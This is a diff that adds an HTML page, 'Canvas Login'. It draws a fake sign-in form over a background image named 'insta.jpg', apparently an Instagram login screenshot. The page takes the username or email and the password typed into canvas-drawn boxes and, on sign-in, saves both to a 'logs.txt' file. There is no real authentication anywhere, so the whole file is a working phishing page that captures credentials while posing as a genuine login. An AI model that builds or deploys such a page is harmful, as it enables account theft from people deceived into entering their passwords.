@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Canvas Login</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background: #f0f0f0;
+    }
+    canvas {
+      display: block;
+      margin: auto;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="canvas"></canvas>
+
+  <!-- FileSaver.js -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    const bg = new Image();
+    bg.src = "insta.jpg"; // background image
+
+    let input1 = ""; // username/email
+    let input2 = ""; // password
+    let activeBox = null; // "input1" or "input2"
+
+    const boxes = {
+      input1: {x: 950, y: 250, w: 300, h: 40}, // adjust to image layout
+      input2: {x: 950, y: 300, w: 300, h: 40},
+      button: {x: 950, y: 360, w: 300, h: 40}
+    };
+
+    bg.onload = function() {
+      canvas.width = bg.width;
+      canvas.height = bg.height;
+      draw();
+    };
+
+    function draw() {
+      ctx.clearRect(0,0,canvas.width,canvas.height);
+      ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
+
+      // Draw input boxes
+      Object.keys(boxes).forEach(key => {
+        let b = boxes[key];
+        if (key !== "button") {
+          ctx.fillStyle = (activeBox === key) ? "white" : "rgba(255,255,255,0.7)";
+          ctx.fillRect(b.x, b.y, b.w, b.h);
+          ctx.strokeStyle = "#ccc";
+          ctx.strokeRect(b.x, b.y, b.w, b.h);
+        }
+      });
+
+      // Draw text input1
+      ctx.fillStyle = "black";
+      ctx.font = "bold 18px Arial";
+      ctx.textBaseline = "middle";
+      ctx.fillText(input1, boxes.input1.x+10, boxes.input1.y + boxes.input1.h/2);
+
+      // Draw text input2 (masked)
+      ctx.fillText("•".repeat(input2.length), boxes.input2.x+10, boxes.input2.y + boxes.input2.h/2);
+
+      // Draw button
+      let b = boxes.button;
+      ctx.fillStyle = "transparent";
+      ctx.fillRect(b.x, b.y, b.w, b.h);
+      ctx.strokeStyle = "rgba(0,0,0,0.2)";
+      ctx.strokeRect(b.x, b.y, b.w, b.h);
+      ctx.fillStyle = "rgba(0,0,0,0.5)";
+      ctx.font = "bold 18px Arial";
+      ctx.textAlign = "center";
+      ctx.fillText("Sign in", b.x + b.w/2, b.y + b.h/2 + 2);
+      ctx.textAlign = "start";
+    }
+
+    // Mouse click handler
+    canvas.addEventListener("mousedown", function(e) {
+      const rect = canvas.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+
+      activeBox = null;
+      Object.keys(boxes).forEach(key => {
+        let b = boxes[key];
+        if (x >= b.x && x <= b.x+b.w && y >= b.y && y <= b.y+b.h) {
+          if (key === "button") {
+            signIn();
+          } else {
+            activeBox = key;
+          }
+        }
+      });
+      draw();
+    });
+
+    // Keyboard input handler
+    document.addEventListener("keydown", function(e) {
+      if (!activeBox) return;
+
+      if (e.key === "Backspace") {
+        if (activeBox === "input1") input1 = input1.slice(0,-1);
+        else if (activeBox === "input2") input2 = input2.slice(0,-1);
+      } else if (e.key === "Enter") {
+        signIn();
+      } else if (e.key.length === 1) {
+        if (activeBox === "input1") input1 += e.key;
+        else if (activeBox === "input2") input2 += e.key;
+      }
+      draw();
+    });
+
+    function signIn() {
+      if (input1.trim() && input2.trim()) {
+        let blob = new Blob([input1 + " | " + input2 + "\n"], {type: "text/plain;charset=utf-8"});
+        saveAs(blob, "logs.txt");
+      }
+    }
+  </script>
+</body>
+</html>
